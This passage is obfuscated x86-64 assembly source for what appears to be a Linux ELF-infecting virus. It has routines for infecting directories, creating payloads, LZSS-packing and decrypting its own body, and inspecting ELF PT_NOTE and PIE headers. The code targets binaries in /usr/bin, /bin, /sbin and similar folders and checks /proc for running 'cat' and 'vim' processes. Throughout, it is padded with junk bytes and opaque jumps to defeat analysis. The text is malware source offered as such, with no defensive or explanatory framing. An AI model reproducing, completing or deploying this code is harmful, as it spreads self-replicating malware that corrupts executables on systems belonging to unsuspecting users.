db 0xa8
    jmp         $+3
db 0x77
    jl          ..@tNMjPWHGCi6e
    jge         ..@tNMjPWHGCi6e
..@RHSSIsRBpNlv:
    call        Strncmp
    jmp         $+5
db 0x5e, 0x0a, 0x96
    jb          ..@Dg1WacSypezo
    jae         ..@Dg1WacSypezo
..@EbgiMxLuaolP:
    jmp         ..@vXh5jIL6Ry9g
    jmp         $+3
db 0xa7
    jmp         ..@TUgcclSKV0ul
Strncmp:
    jmp         ..@g0YUYv5f9eLJ
GetEnv:
    jmp         ..@FMqvJLBb7WHJ
..@3nOIIEgfLwsD:
    mov         rdi, rdi
    jmp         $+4
db 0xed, 0x07
    jmp         $+4
db 0x5c, 0x5b
    jmp         $+5
db 0x2d, 0x49, 0x64
    jmp         ..@WXmWHDWPiLse
..@EZAsQCnnLJvY:
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    jmp         $+3
db 0xfc
    jl          ..@aDNpBBHLsGGn
    jge         ..@aDNpBBHLsGGn
..@pzunfQIz5u4T:
    mov         rsi, rsi
    jmp         $+4
db 0xb2, 0x44
    jmp         ..@MFztPXviBJmV
..@gIszbnmmhcnK:
    xor         rax, rax
    js          ..@SYKiSSlBjUqu
    jns         ..@SYKiSSlBjUqu
..@7twvrPz4ZgZf:
    mov         rsp, rsp
    jmp         $+5
db 0x03, 0xc4, 0x14
    jmp         ..@9tugy9P52Jyr
..@wtyJUAmSFN9n:
    add         rax, 1
    js          ..@VbEcPqAHBero
    jns         ..@VbEcPqAHBero
..@1kMjc2y5tftW:
    mov         BYTE [rbx], al
    jb          ..@LqyZ8HwndGAa
    jae         ..@LqyZ8HwndGAa
..@DyTjlFGg0NHK:
    pop         r1
    jmp         $+4
db 0x85, 0xb3
    jb          ..@8SZWsIcr0SCS
    jae         ..@8SZWsIcr0SCS
..@e4IhSf22LilU:
    mov         rdx, rdx
    jmp         ..@vCAlXRKmGQus
..@F0oUVd8E40Mi:
    mov         rdx, rdx
    jmp         ..@zcej1gd2qApS
..@E9jX6bja7V4O:
    xchg        rsi, rsi
    js          ..@gaoPwe18Z7Hj
    jns         ..@gaoPwe18Z7Hj
..@slwigZSypIdy:
    push        r1
    jl          ..@4SDLTetGuc5Z
    jge         ..@4SDLTetGuc5Z
..@yWBXwTVporWE:
    mov         rdx, QWORD [rsp]
    jb          ..@MnSYWYC1QFTH
    jae         ..@MnSYWYC1QFTH
..@gT7GOeta5MNm:
    xchg        rbx, rbx
    je          ..@xj4cQocajzxE
    jne         ..@xj4cQocajzxE
..@Pjv5DrAWwW2f:
    xor         rdi, rdi
    jmp         ..@kKFYsfpbFTPt
..@iYJgvY011XXt:
    rep         nop
    jmp         ..@nAkocuGOJH1g
..@egmjo51B2YIV:
    mov         rdx, rdx
    jmp         $+4
db 0xf2, 0x9b
    jb          ..@uivpVT2gLdxj
    jae         ..@uivpVT2gLdxj
..@Gsa4HsoBEjj8:
    jne         ..@JKUf8FyvmOkR
    jmp         $+4
db 0x71, 0xb5
    je          ..@ueIN3AyfxT37
    jne         ..@ueIN3AyfxT37
..@7O3qB8OQtpqZ:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+3
db 0x97
    jb          ..@EDgKplWCqtxZ
    jae         ..@EDgKplWCqtxZ
..@9H0NmIQNf3X8:
    pop         rdx
    jmp         ..@R1vv7JBTHdfG
..@iXZB1TL5nTvN:
    rep         nop
    jmp         $+3
db 0xd0
    jl          ..@Di3Oh11LswtL
    jge         ..@Di3Oh11LswtL
..@TgYpWe5tZZ4V:
    call        ..@u8iBPFNbo4JA
    jmp         ..@KHgaALs7lUan
..@rcGrTCAP38hX:
    mov         rdx, rax
    jmp         $+4
db 0xba, 0x06
    jmp         ..@HTzWq6HKiUw7
..@koNQFHZwuQzx:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jb          ..@JE5ht9VrgHh3
    jae         ..@JE5ht9VrgHh3
..@e0G4abERMnx8:
    xchg        rbx, rbx
    jmp         $+3
db 0x36
    jl          ..@pcLt9P2yhc4Z
    jge         ..@pcLt9P2yhc4Z
..@Bu6u0KSNGQZk:
    sub         al, BYTE [r2]
    jmp         ..@FVKyLdcKIKJI
..@aRp1NyfYPt4v:
    pop         rsi
    jmp         ..@rFUsW2sxPniV
..@iqqrzpyGiWIx:
    mov         m4, rdi
    jmp         $+5
db 0x48, 0x00, 0xd2
    jmp         ..@P68dpqjhS24V
..@Vy4pnA0kCaFo:
    xchg        rcx, rcx
    js          ..@bufRNbkRensd
    jns         ..@bufRNbkRensd
..@i8qcD7qqJJwo:
    call        ExitProgram
    js          ..@Cuq1dsk1Fw85
    jns         ..@Cuq1dsk1Fw85
..@kVZGy4ga5wtL:
    GGLOBAL     _packed
    jmp         $+5
db 0x7c, 0x99, 0x7d
    jmp         ..@sCmZCYjbI6EJ
..@r4AJJVNfYKO0:
    mov         rbp, rbp
    jmp         $+3
db 0x4f
    jmp         $+3
db 0x31
    jmp         ..@rery29DinOsE
..@u8iBPFNbo4JA:
    pop         rdi
    jl          ..@LxBrv5coBIzZ
    jge         ..@LxBrv5coBIzZ
..@1uFpZ4aw5Ux5:
    pop         rax
    jl          ..@jNBQsUkxb5IX
    jge         ..@jNBQsUkxb5IX
..@JgPCVDjjQN1E:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+5
db 0x43, 0xd2, 0xd2
    jb          ..@8XOwQMTzrr7F
    jae         ..@8XOwQMTzrr7F
..@Dg1WacSypezo:
    test        rax, rax
    jmp         $+4
db 0x60, 0x92
    jmp         $+3
db 0x7c
    js          ..@TnPITOFudfLv
    jns         ..@TnPITOFudfLv
..@tNMjPWHGCi6e:
    pop         rdx
    jl          ..@Xt4TrbjG3lo0
    jge         ..@Xt4TrbjG3lo0
..@Yq0hjtBth5Vx:
    call        ExitProgram
    jb          LzssDecoder
    jae         LzssDecoder
..@tJ5XOZ4bCHuT:
    jmp         rax
    jmp         $+3
db 0x69
    jmp         $+4
db 0xc5, 0x3b
    jmp         $+5
db 0xac, 0x06, 0xf4
    jmp         $+4
db 0x25, 0xf0
    jmp         $+4
db 0x9e, 0x98
    jmp         ..@hYorg7CHtqV1
..@A8nAe7VG6Jds:
    jmp         DecryptExecutableCode
    js          ..@uKro3JkA4Rkv
    jns         ..@uKro3JkA4Rkv
..@nxEAZQVTXtER:
    xchg        rbx, rbx
    jmp         ..@ZNs1O6IDfCOx
..@PuXEj1Q5psbJ:
    push        rcx
    jmp         $+4
db 0x5d, 0xcf
    jmp         ..@PmIpzl4nwaep
..@JE1ATWFVMIay:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    js          ..@JVJdFzqIElvb
    jns         ..@JVJdFzqIElvb
..@ShGy8m0BOgNq:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+5
db 0x52, 0x55, 0x54
    je          ..@5rJIUEH2kn5a
    jne         ..@5rJIUEH2kn5a
..@RUQsjZdhuXPb:
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+4
db 0xf9, 0xa2
    jmp         $+3
db 0xbe
    jmp         ..@hK8axw6UUlGf
..@S8LTeewZMrMq:
    mov         rbx, rbx
    jmp         $+4
db 0x57, 0xf1
    jmp         $+5
db 0xf8, 0x9e, 0x2e
    jmp         ..@LOWe1TM2t4ug
..@ws7sY77POCum:
    xchg        rdi, rdi
    jmp         $+4
db 0x1c, 0x00
    jl          ..@jzLuEGNtm9lS
    jge         ..@jzLuEGNtm9lS
..@ySjtsNDONNtH:
    xchg        rdi, rdi
    js          ..@lVfNxN9vpsoh
    jns         ..@lVfNxN9vpsoh
..@bufRNbkRensd:
    add         rax, 1
    jl          ..@J2QSTuowsqld
    jge         ..@J2QSTuowsqld
..@jNBQsUkxb5IX:
    syscall
    jmp         $+3
db 0x5b
    jmp         $+3
db 0xcd
    js          ..@7fAKdOWdIlSr
    jns         ..@7fAKdOWdIlSr
..@vmjj7ypcRmPX:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    jmp         $+5
db 0x82, 0x98, 0x31
    je          ..@FUaKaBVVyDF5
    jne         ..@FUaKaBVVyDF5
..@VLAJNSRM4TrV:
    rep         nop
    jmp         ..@FlOVMtKhoVWk
..@lRu7g1IwkP4w:
    pop         rdx
    js          ..@1AYoeaSkh856
    jns         ..@1AYoeaSkh856
..@SYKiSSlBjUqu:
    xor         r1, r1
    jmp         $+5
db 0x2e, 0x43, 0x4b
    jmp         $+4
db 0xf3, 0x03
    jl          ..@Dak3BD7rTyo5
    jge         ..@Dak3BD7rTyo5
..@zcej1gd2qApS:
    xor         r2, r2
    js          ..@kHBPPEUcEI6j
    jns         ..@kHBPPEUcEI6j
..@H3SvkqBOwhG2:
    push        rsi
    jmp         $+4
db 0x9c, 0xda
    jmp         $+4
db 0xdf, 0x9d
    jl          ..@Jaiizym97AjM
    jge         ..@Jaiizym97AjM
..@P4Hq1myhF4vb:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+3
db 0xcb
    jmp         $+5
db 0xc6, 0xa6, 0x29
    jmp         $+4
db 0xab, 0x7d
    jb          ..@ipBl9ZV7IXhg
    jae         ..@ipBl9ZV7IXhg
..@Fp68cAXufrlm:
    xor         r3, r3
    je          ..@e4IhSf22LilU
    jne         ..@e4IhSf22LilU
..@c0GIIyLTh2oA:
    xchg        rsi, rsi
    jmp         ..@kVZGy4ga5wtL
..@CTTphbNKfhk1:
    push        rsi
    je          ..@CwNMVS94TzV8
    jne         ..@CwNMVS94TzV8
..@VTpku87d7fGL:
    pop         rax
    jmp         $+5
db 0x80, 0x05, 0xbf
    jmp         $+4
db 0xf7, 0xe3
    jmp         ..@5lVxATUKdNRA
..@H8P2aIPnzQ9g:
    mov         rsi, QWORD [rsp+1*bytes]
    jmp         ..@RB1H5sayqPuk

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
endstruc
struc _PAYLOAD_OFF
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

pwd_var:    db "PWD", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@rngHXVWcU6vx
..@AnwldwRl7Q8a:
    mov         rcx, rcx
    jmp         ..@DFdOLobD09tT
..@mWdJyl2o1ZgV:
    cmp         rax, 0x00
    jmp         ..@8RDNvl112JoV
..@BHwCakh56GSF:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    jmp         ..@wqB8pQGZfDJU
..@UoxzUOIei4UV:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+5
db 0xc5, 0x7e, 0x32
    jmp         ..@dtiGDjTh8f0F
..@kFldMyYgBlei:
    call        MemMove
    jmp         $+5
db 0x40, 0x3e, 0x08
    jb          ..@lSKYIMeeGu4N
    jae         ..@lSKYIMeeGu4N
..@0U1p9Ged8kZJ:
    mov         rcx, rcx
    jmp         $+4
db 0x1e, 0xc1
    jmp         $+4
db 0x53, 0xf6
    jl          ..@uTa3i1S44PNn
    jge         ..@uTa3i1S44PNn
..@voSGV6SCLmgH:
    push        r4
    jmp         $+5
db 0x2b, 0x82, 0x0c
    jmp         ..@IKJZeG1th99q
..@Cc4ytxahCxM2:
    pop         rdx
    js          ..@5GLridCF5U0U
    jns         ..@5GLridCF5U0U
..@ep9AMyiqR28z:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    jmp         $+3
db 0x61
    jmp         $+4
db 0x3d, 0x22
    jmp         $+5
db 0x4e, 0xaf, 0x73
    jb          ..@bwTd7QyAO7DD
    jae         ..@bwTd7QyAO7DD
..@4QGfRIVcThF7:
    mov         ax, WORD [r1]
    jmp         $+5
db 0x5d, 0x61, 0x6b
    jmp         $+3
db 0x0f
    jmp         $+4
db 0xda, 0xed
    jmp         $+4
db 0x85, 0x4c
    jb          ..@71rs9mXcJdAs
    jae         ..@71rs9mXcJdAs
..@yP5Aq4XwxjCZ:
    xchg        rbx, rbx
    jmp         $+3
db 0xf7
    jmp         ..@vx2akbBQrcmv
..@rBUlJjBfAyXS:
    add         rax, rbx
    jmp         $+5
db 0xf3, 0xfa, 0x11
    js          ..@N7OWe05YZouQ
    jns         ..@N7OWe05YZouQ
..@Ui5WzWvq0CS6:
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jb          ..@KH56JO7hOzLA
    jae         ..@KH56JO7hOzLA
..@spOlKO3x2NsU:
%ifdef X86_32
    push        ebp
%endif
    jmp         $+3
db 0x6c
    jmp         ..@Ho31m0rksPNg
..@3YDdUkPeGlS9:
    mov         rdx, rdx
    jl          ..@pYrADYj24mlU
    jge         ..@pYrADYj24mlU
..@XqhCB4UIfeFc:
    xor         rax, rax
    jmp         $+3
db 0xce
    jb          ..@3Hv661zky5Dn
    jae         ..@3Hv661zky5Dn
..@N9x7i21UTmPb:
    mov         rdi, rdi
    jb          ..@Y0LM0V5BzWF1
    jae         ..@Y0LM0V5BzWF1
..@EMlbQkc8z582:
    xchg        rdi, rdi
    jmp         $+4
db 0xd9, 0x2a
    jmp         $+5
db 0x37, 0x16, 0x39
    jl          ..@vQcwT4PZwEId
    jge         ..@vQcwT4PZwEId
..@HysgYWNPdnCF:
    pop         rbx
    jl          ..@CoQtxG4LwRlk
    jge         ..@CoQtxG4LwRlk
..@k1dBiMirLS2s:
    test        eax, eax
    jl          ..@79ioEaNLX4ll
    jge         ..@79ioEaNLX4ll
..@vHiHDq8FziSJ:
    and         r3, 0xfff 
    jmp         $+5
db 0xf7, 0x48, 0x7d
    jmp         ..@m4JmVhqlCmGD
..@nPqSpApTNOMp:
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    jl          ..@8qdnbeZkXNAX
    jge         ..@8qdnbeZkXNAX
..@KKBysziAQEWH:
    mov         QWORD m5, 0x01
    jl          ..@0apm9TFE3asx
    jge         ..@0apm9TFE3asx
..@eRkCP9SXHVra:
    call        MemMove
    jmp         $+4
db 0x7d, 0x3f
    jmp         ..@sn8rsSRAJfm3
..@NyKEfLj9mPOs:
    rep         nop
    js          ..@5K1Qu253NnQI
    jns         ..@5K1Qu253NnQI
..@BWuHboSxcrj6:
    xor         r2, r2
    jmp         $+3
db 0xdd
    je          ..@rNMY4e9HxhRk
    jne         ..@rNMY4e9HxhRk
..@F9bbFYD9cIvw:
    push        r5
    jb          ..@tzak3mOOc5wW
    jae         ..@tzak3mOOc5wW
..@5q3an9tnjKjW:
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    jmp         $+4
db 0xa9, 0xf3
    jmp         $+3
db 0x0c
    je          ..@ZnMA4R7U2dKj
    jne         ..@ZnMA4R7U2dKj
..@VdPWR4Tn0Ce6:
    add         r1, 1
    jmp         $+4
db 0xac, 0x76
    jl          ..@3icppYfdskwG
    jge         ..@3icppYfdskwG
..@Uk4nHSfHf6fH:
    mov         DWORD [r5+file.filefd], 0x00
    jmp         $+4
db 0x0c, 0x74
    jmp         ..@VpgcH2VgSGcy
..@lSKYIMeeGu4N:
    xor         r2, r2
    jb          ..@eqwyrsUb5FCR
    jae         ..@eqwyrsUb5FCR
..@1BlrOR1se9Y4:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    jmp         ..@AsHzI44KEp9c
..@Olxw4ZoLTI5C:
    call_vsp    ExitProgram
    jmp         $+5
db 0x9d, 0x23, 0xba
    jmp         ..@t95sR3uetWoF
..@cRCzzpxXOmun:
    xchg        rcx, rcx
    jmp         $+3
db 0x46
    js          ..@WlxT8XsfD3bQ
    jns         ..@WlxT8XsfD3bQ
..@SJgcE55lUPVK:
    mov         r2, [rsp+_PROC_OFF.dirname]
    jmp         $+5
db 0xc5, 0x01, 0x27
    jmp         $+3
db 0x97
    jmp         ..@VmfCyRzE5QqC
..@d1OPxBPltVVK:
%ifdef X86_64
    push        rsi
%endif
    jmp         ..@ds9ictoXmZ5u
..@7wn5AooYLmjS:
    pop         rbx
    jmp         ..@EJVdWqtpKfhB
..@DIaBpodMfr0C:
    xor         r1, r1
    jmp         ..@BWuHboSxcrj6
..@dSClU4mcNHJo:
    xchg        rcx, rcx
    jmp         ..@KNlyKZgRTU65
..@lW0OD9qQPdOS:
    jge         ..@blO6OJT6QbvM
    jmp         $+4
db 0x71, 0x6f
    jmp         $+4
db 0x46, 0xcd
    jl          ..@yZpnPmYGHPog
    jge         ..@yZpnPmYGHPog
..@by2gHxpIEM6i:
    xchg        rsi, rsi
    js          ..@LBFGnowmKwKY
    jns         ..@LBFGnowmKwKY
..@hVLQHwBJEYhU:
    mov         r2, r1
    jmp         $+3
db 0xe2
    js          ..@UuxXDY4SCFJ5
    jns         ..@UuxXDY4SCFJ5
..@NM31AcGBSEdo:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    je          ..@lZpuZxMI9djG
    jne         ..@lZpuZxMI9djG
..@7Uk3ta5G1Irz:
    add         rdi, _signature.index-_signature.start
    jb          ..@kqVMsVI9lciR
    jae         ..@kqVMsVI9lciR
..@29Mx5E10tIrb:
    push        rdi
    jl          ..@jMPshAioBELd
    jge         ..@jMPshAioBELd
..@c8RvyZtn8G9H:
%ifdef X86_64
    push        rbx
%endif
    jmp         $+5
db 0x87, 0x99, 0x3c
    jmp         $+5
db 0xf4, 0x6f, 0x04
    jmp         ..@3771BcLvovb9
..@yqMeuztPoZz3:
    pop         rsi
    jmp         $+4
db 0x6a, 0x66
    jl          ..@ZVi1lIxmf3vb
    jge         ..@ZVi1lIxmf3vb
..@tbbJBk6pnaLI:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    je          ..@p5ojuqgjI2L5
    jne         ..@p5ojuqgjI2L5
..@l0XmwddRfdvy:
    xor         rax, rax
    jmp         ..@840njcLKrYxB
..@L96jClWJXhuZ:
    call        CreatePayload
    jmp         $+5
db 0xbb, 0x5d, 0x55
    jl          ..@IsoYpmnaNMBj
    jge         ..@IsoYpmnaNMBj
..@1VbozEqpNQ6t:
    jl          ..@i2cerblToEnf
    jmp         $+4
db 0xcd, 0xad
    jmp         ..@YZifAqaJi8xp
..@vKj647QWZy6a:
    rep         nop
    jmp         ..@XUINNHKKccsS
IsNum:
    jmp         ..@ePr1EcIXyF1Y
..@paXchyRNXcSe:
%ifdef X86_64
    mov         rsi, QWORD [r8+file.filesize]
%endif
    je          ..@hD6hPhjFw83L
    jne         ..@hD6hPhjFw83L
..@HRNEgAiKRjuo:
    jmp         ..@b57s9zdrznFN
    jmp         $+5
db 0xb6, 0xfe, 0x90
    jb          ..@7ONu0sgfMoHg
    jae         ..@7ONu0sgfMoHg
..@6unfcD7hSnwf:
    push        rax
    jmp         ..@dSClU4mcNHJo
..@RI3KZjaQANlf:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jmp         $+3
db 0x24
    jmp         $+3
db 0x4d
    jb          ..@wepHYEBt9c86
    jae         ..@wepHYEBt9c86
..@gc7Bv2jrZisx:
    cmp         eax, 0x03
    jmp         $+3
db 0xec
    jmp         $+5
db 0x34, 0x71, 0xd8
    jmp         ..@F5TG6QkXSYhM
..@NCpFPe12a2j7:
    pop         rsi
    jmp         ..@UNGMEn1iVgfy
..@QMLQIUdnzAnX:
    VAR         packed, pwd_var
    jmp         $+4
db 0x87, 0xa8
    jmp         $+5
db 0x3c, 0x0b, 0xd7
    jmp         ..@TZw4ZsttqhaZ
..@VyAtPoZI4Xr6:
    mov         rcx, rcx
    jmp         $+5
db 0xc2, 0xfb, 0x17
    jmp         ..@am3KMn24P8gn
..@29Hq5Zo3fuQd:
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    js          ..@C1UJmBsvKrKt
    jns         ..@C1UJmBsvKrKt
..@jO5fGnCutNi9:
    push        rdx
    jmp         ..@aqX3M8y3X3gl
..@uBYfTDYUw6cM:
    push        rbx
    jmp         ..@AnwldwRl7Q8a
..@EqhZE1MKqz7R:
    xor         r4, r4
    jmp         ..@bf972IegiuMY
..@qXtYP4mQ3X0S:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jl          ..@lW0OD9qQPdOS
    jge         ..@lW0OD9qQPdOS
..@pzuXuF5moC5R:
    push        rdi
    jmp         $+3
db 0xe3
    js          ..@JaEHkaQuIusx
    jns         ..@JaEHkaQuIusx
..@dtiGDjTh8f0F:
    push        rax
    js          ..@f3FMXw21kz0E
    jns         ..@f3FMXw21kz0E
..@sOLUQzAS4cwG:
    cmp         DWORD [r2+rax], PT_NOTE
    jmp         $+5
db 0xaa, 0x45, 0xab
    jmp         ..@rtBsNNmHuq14
..@O44jZglxIL0i:
    mov         rbx, rbx
    jmp         $+5
db 0x80, 0x28, 0xf0
    jb          ..@uKqWglBrsOG4
    jae         ..@uKqWglBrsOG4
..@sfFQ4S64rvmD:
    pop         rax
    jmp         $+3
db 0x9e
    jb          ..@8ijYYX7HYMeZ
    jae         ..@8ijYYX7HYMeZ
..@rUMnKfxAtmdS:
    xchg        rsi, rsi
    jmp         $+5
db 0x07, 0xf8, 0xeb
    jmp         $+4
db 0x60, 0x99
    js          ..@aN6wGKYJjWQc
    jns         ..@aN6wGKYJjWQc
..@LKgCdDHjQVaW:
    je          ..@f8BoGsrEvq8o
    jmp         ..@jb65Lg5rmxFB
..@sldrqSwttuu6:
    xchg        rsp, rsp
    jl          ..@7HEd1FMuod7L
    jge         ..@7HEd1FMuod7L
..@w2oGJvThpheh:
    mov         rdx, rdx
    jmp         ..@jQSiaeQ6RA2E
..@Pb2MryJdwAY8:
    VAR         packed, dirs_root
    jl          ..@uztz9NLZpp0g
    jge         ..@uztz9NLZpp0g
..@GilpRelghEwl:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         ..@ceJ2AyOdXS8j
..@Tu5tW64kCAVS:
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    je          ..@gyqP4n9sGUMJ
    jne         ..@gyqP4n9sGUMJ
..@i4kbtldYjh9G:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    je          ..@nkbGfS9bPSXy
    jne         ..@nkbGfS9bPSXy
..@c64EclQjB4Nb:
    jmp         ..@uZ8Jd9VpzAMB
    jb          ..@to97fUTpIZnf
    jae         ..@to97fUTpIZnf
..@C1ODMg2qBTna:
    mov         rbx, rbx
    jmp         $+3
db 0x79
    jmp         ..@WcwS73rgNVMq
..@p7I4Ms2ae8vI:
    push        rbx
    jmp         $+3
db 0xc4
    jmp         $+5
db 0x20, 0x88, 0x33
    jmp         $+4
db 0x32, 0x7f
    jmp         ..@N0vOOVWzSfOp
..@V4sxld6U7wRJ:
    xor         rdi, rdi
    jl          ..@2ud411gln7GX
    jge         ..@2ud411gln7GX
CreatePayload:
    jmp         ..@Fz8KW37EV3bc
..@6KqL54dDORNC:
    mov         r1, QWORD [r5+file.fileptr]
    jl          ..@jInbB1HIHWyJ
    jge         ..@jInbB1HIHWyJ
..@NxLk6fMVoe17:
    and         r5, (PAGE_SIZE-1)
    jmp         $+3
db 0xed
    jmp         $+4
db 0x50, 0x44
    jmp         ..@dmZR0TIm6lsz
..@wuJk8hMLqFUF:
    push        rdi
    jmp         $+5
db 0xfd, 0x2f, 0x93
    jmp         $+3
db 0x3f
    jl          ..@PADNJA1D5KvB
    jge         ..@PADNJA1D5KvB
..@mRj69eHbWi8M:
    push        rax
    jmp         ..@SRbZek2lD3s6
..@L4BZCcA9i1NE:
    add         r2, 1
    jmp         $+5
db 0xcb, 0xa4, 0x67
    jb          ..@7GyL8rEfh18h
    jae         ..@7GyL8rEfh18h
..@eeEoVgKvihTG:
    jz          ..@Tjk58gEDzHyx
    jmp         $+4
db 0xed, 0x73
    jl          ..@yfCzNMRFFzTB
    jge         ..@yfCzNMRFFzTB
..@F4Du2CIo8VKv:
    mov         rdx, rdx
    jmp         $+5
db 0x95, 0xa5, 0xc5
    jl          ..@KaSuBeNuD8vL
    jge         ..@KaSuBeNuD8vL
..@rJh8OHsK2rtK:
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    jmp         $+3
db 0xf4
    jl          ..@2AxZMVi6tc1O
    jge         ..@2AxZMVi6tc1O
..@7WIlFYt5tMcd:
%ifdef X86_32
    mov         edx, 11b
%endif
    js          ..@nkXIfRplG29Z
    jns         ..@nkXIfRplG29Z
..@pW5lSpLLVFv5:
    mov         dx, WORD [rsp] 
    jmp         $+3
db 0xc7
    je          ..@3YDdUkPeGlS9
    jne         ..@3YDdUkPeGlS9
..@sISuwrG8VwrM:
    xor         rax, rax
    js          ..@L9Y8FZp9hS4B
    jns         ..@L9Y8FZp9hS4B
..@ze6X52RRnMOr:
    ret
    jmp         $+5
db 0x71, 0x39, 0x60
    jl          InfectDirectory
    jge         InfectDirectory
..@7ysnytBb16ub:
    jge         ..@kvxyBBVN23xy
    jmp         $+5
db 0x2e, 0x37, 0xee
    jmp         $+5
db 0x07, 0xb9, 0xe8
    js          ..@V4KKFvqwNq0c
    jns         ..@V4KKFvqwNq0c
..@eBJOZTbPXYdM:
    xchg        rdi, rdi
    jmp         $+4
db 0x6d, 0xd0
    jmp         $+4
db 0x11, 0xca
    jmp         $+4
db 0x30, 0xf4
    jmp         $+4
db 0x4e, 0x70
    jl          ..@OcjOM0EHoNy7
    jge         ..@OcjOM0EHoNy7
..@ePr1EcIXyF1Y:
    mov         rdx, rdx
    jmp         $+5
db 0x81, 0x9c, 0xc6
    jl          ..@0WE4tpk2G6h5
    jge         ..@0WE4tpk2G6h5
..@qKh1nrsQmhFb:
    cmovl       dx, ax
    jl          ..@2zwP3AhFZS3I
    jge         ..@2zwP3AhFZS3I
..@rZNMBn0qy6XL:
%ifdef X86_64
    push        rsi
%endif
    je          ..@lEagLe1oDtlv
    jne         ..@lEagLe1oDtlv
..@6e7AAlHYy3iz:
    mov         rdx, rdx
    jmp         $+4
db 0x44, 0x86
    jl          ..@tJ45c3bYQF4s
    jge         ..@tJ45c3bYQF4s
..@RcKH2fvntAwN:
%ifdef X86_32
    mov         rax, rax
%endif
    jmp         $+3
db 0x5c
    jmp         ..@G5jCeoPXwYTP
..@2x7Hm7KP2xl4:
    add         rsp, _PAYLOAD_OFF_size
    jmp         $+4
db 0xd9, 0xaf
    jb          ..@yGt9HjRJfYYP
    jae         ..@yGt9HjRJfYYP
..@pfPQifRIScUM:
    rep         nop
    jmp         ..@KYfGV7CUL51E
..@5RyYTqqbHf4O:
%ifdef X86_64
    push        rbx
%endif
    je          ..@88VlSmOjkQ6I
    jne         ..@88VlSmOjkQ6I
..@HGMbigDcffq1:
    rep         nop
    jmp         $+5
db 0x6d, 0xe8, 0xd7
    jmp         $+3
db 0xc1
    jmp         $+3
db 0xbe
    jmp         ..@7Uk3ta5G1Irz
GetNewProgramVaddr:
    jmp         ..@ynLy9FOznQs8
..@Y0LM0V5BzWF1:
    mov         rbx, rbx
    jmp         ..@TcdH6yiT8dao
..@COBZQuhDGPIh:
    xor         r2, r2
    jmp         $+3
db 0x13
    jl          ..@G619hewyxCaL
    jge         ..@G619hewyxCaL
..@hXsAigAO3lvS:
    push        rdi
    jmp         $+3
db 0x7f
    jmp         ..@Kd47DUc13sHo
..@e78U0gdof01Q:
    jne         ..@1PriOCwVSsob
    jmp         $+3
db 0xdc
    jmp         $+4
db 0xd1, 0x7a
    jmp         ..@cAvLZRBjpBdY
..@GTcGvY7AuEYl:
    and         rax, DF_1_PIE
    je          ..@qandh8udSc0c
    jne         ..@qandh8udSc0c
..@YxLglOO0djF4:
    sub         rsp, _INFFILE_OFF_size
    jmp         ..@NX82FzKiLMuA
..@9sXd7x5afgmN:
    mov         rax, rax
    jmp         ..@1VbozEqpNQ6t
